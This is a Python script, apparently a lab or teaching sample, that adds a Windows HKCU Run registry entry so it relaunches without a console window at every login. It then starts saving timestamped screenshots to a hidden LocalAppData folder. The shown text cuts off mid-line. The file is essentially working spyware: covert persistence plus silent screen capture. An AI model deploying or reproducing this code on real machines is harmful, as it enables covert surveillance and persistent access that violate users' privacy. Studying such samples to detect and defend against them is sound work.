# screenshot.py
import os
import time
import sys
import winreg
from PIL import ImageGrab

def establish_persistence():
    """
    Establishes persistence by adding a 'Run' key to the Windows Registry.
    This mimics the behavior of the malicious setup.py hook.
    """
    # 1. Resolve the absolute path to this specific script
    # Use __file__ to get the current location of screenshot.py
    script_path = os.path.abspath(__file__)
    
    # 2. Target the 'Run' key for the current user
    # This does NOT require Administrator privileges
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Open the registry key with SET_VALUE permissions
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)

        # Use pythonw.exe to ensure the script runs without a visible console window
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        command = f'"{pythonw}" "{script_path}"'

        # Set the value so it executes at every user login
        winreg.SetValueEx(key, "LabScreenshot Monitor", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        print("[!] Persistence entry created successfully.")
    except Exception as e:
        # Fail silently in a real scenario; print for educational debugging
        print(f"[-] Could not set registry key: {e}")

def main():
    # Attempt to set the registry key every time the program is manually run
    establish_persistence()

    # Define a hidden/standard path for saving screenshots
    # LocalAppData is writable by the user and hidden by default
    save_path = os.path.join(os.getenv('LOCALAPPDATA'), "Temp", "LabScreenshots")
    
    # Ensure the directory exists
    if not os.path.exists(save_path):
        os.makedirs(save_path)

    # Generate a unique filename using the current date and time
    now = time.strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"capture_{now}.png"
    full_file_path = os.path

